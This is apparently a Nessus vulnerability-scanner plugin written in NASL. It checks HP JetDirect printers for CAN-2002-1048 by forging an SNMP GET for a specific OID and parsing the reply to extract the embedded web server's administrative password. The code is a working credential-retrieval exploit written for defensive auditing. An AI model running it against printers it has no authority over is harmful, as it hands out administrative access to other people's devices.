# This plugin is a rip from snmp_sysDesc.nasl
# This rip was written by Geoff Humes <geoff.humes@digitaldefense.net>
#
# snmp_sysDesc.nasl was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


if(description)
{
 script_id(11317);
 script_cve_id("CAN-2002-1048");
 script_bugtraq_id(7001);
 script_version ("$Revision: 1.8 $");
 
 name["english"] = "Discover HP JetDirect EWS Password via SNMP";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
This script attempts to obtain the password of the remote
HP JetDirect web server (available in some printers)
by requesting the OID :

.1.3.6.1.4.1.11.2.3.9.1.1.13.0

Of the remote printer.

An attacker may use this flaw to gain administrative access on
that printer.

For more information:
http://www.securityfocus.com/archive/1/313714/2003-03-01/2003-03-07/0
http://www.iss.net/security_center/static/9693.php
http://www.iss.net/issEn/delivery/xforce/alertdetail.jsp?id=advise15

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Enumerates password of JetDirect Web Server via SNMP";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003 Digital Defense, Inc.");
 family["english"] = "SNMP";
 script_family(english:family["english"]);
 script_dependencie("snmp_default_communities.nasl");
 exit(0);
}

include("http_func.inc");


passwordless = 0;
password = string("");
equal_sign = raw_string(0x3D);
nothing = raw_string(0x00);

community = get_kb_item("SNMP/community");
if(!community)exit(0);

port = get_kb_item("SNMP/port");
if(!port) port = 161;

#--------------------------------------------------------------------#
# Forges an SNMP GET packet                                          #
#--------------------------------------------------------------------#
function get(community, object)
{
 len = strlen(community);
 len = len % 256;
 
 tot_len = 23 + strlen(community) + strlen(object);
 packet = raw_string(0x30, tot_len, 0x02, 0x01, 0x00, 0x04, len);
 object_len = strlen(object) + 2;
 
 pack_len = 16 + strlen(object);
 packet = packet + community + raw_string( 0xA0,
	pack_len, 0x02, 0x04, 0x5e, 0xa4, 0x3f, 0x0c, 0x02, 0x01, 0x00, 0x02,
	0x01, 0x00, 0x30, object_len) + object + raw_string(0x05, 0x00);
 return(packet);
}

#--------------------------------------------------------------------#
# Checks if JetDirect is vulnerable                                  #
#--------------------------------------------------------------------#
function vulnerable()
{

 #if firmware is current, url will give a 200 or a 401
 url = string("/hp/jetdirect/tcp_param.htm");
 port = 80;
 reply = 0;

 soc = http_open_socket(port);
 if(soc)
 {
  request = http_get(item:url, port:port);
  send(socket:soc, data:request);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  #if 404 returned, old firmware present
  if("404 Not Found" >< r)
  {
   soc = http_open_socket(port);
   if(soc)
   {
    url = string("/");
    request = http_get(item:url, port:port);
    send(socket:soc, data:request);
    r = http_recv(socket:soc);
    http_close_socket(soc);
    #if / gives 404, web server is disabled - gives 404 for any request
    if(!("404 Not Found" >< r))
    {
     reply = 1;
    }
   }
  }
 }

 return(reply);
}



if(!(vulnerable())) exit(0);


soc = open_sock_udp(port);

MIB = raw_string(0x30, 0x11, 0x06, 
		   0x0D, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x0B, 0x02,
		   0x03, 0x09, 0x01, 0x01, 0x0D, 0x00);
		  
req = get(community:community, object:MIB);

send(socket:soc, data:req);
r = recv(socket:soc, length:1025);

if(!strlen(r))exit(0);

len = strlen(r);

start = 0;
for(i=0;(i+2)<len;i=i+1)
{
 #look for preamble to password
 if(ord(r[i]) == 0x04)
 {
  if(ord(r[i + 1]) == 0x82)
  {
   if(ord(r[i + 2]) == 0x01)
   {
    start = i + 4;
    i = len;
     #found password, check if blank
     if(r[start] == nothing)
     {
      if(r[start+1] == nothing)
      {
       if(r[start+2] == nothing)
       {
        if(r[start+3] == nothing) 
        {
         passwordless = 1;
        }
       }
      }
     }
   }
  }
 }
}

#some printers respond with nothing but 04 00 when passwordless
if(start == 0 && len >= 2)
{
 if((ord(r[len - 1]) == 0x00) && (ord(r[len - 2]) == 0x04))
 {
   passwordless = 1;
 }
}

if(!(passwordless))
{
 password = string("The password is ");
 #password format is password=108;  here we look for the = as the end of the passwd
 for(i=start;i<len;i=i+1)
 {
  if(r[i] == equal_sign)
  {
   i=len;
  }
  else
  {
   password = password + r[i];
  }
 }
}


report = "";

if(strlen(password) > 1)
{
report = string("
It was possible to obtain the remote printer embedded web server
password ('", password, "') by querying the SNMP OID
.1.3.6.1.4.1.11.2.3.9.1.1.13.0.

An attacker may use this flaw to gain administrative privileges on this
printer

Risk factor : High");
}
else 
{
 if(passwordless)
 {
  report = "It was possible to obtain the remote printer embedded web server 
password by querying the SNMP OID .1.3.6.1.4.1.11.2.3.9.1.1.13.0 and we
discovered that the remote printer has no password set !

An attacker may use this flaw to gain administrative privileges on this
printer

Risk factor : High";

 }
}

if(report)
{
security_hole(port:port, data:report, protocol:"udp");
}
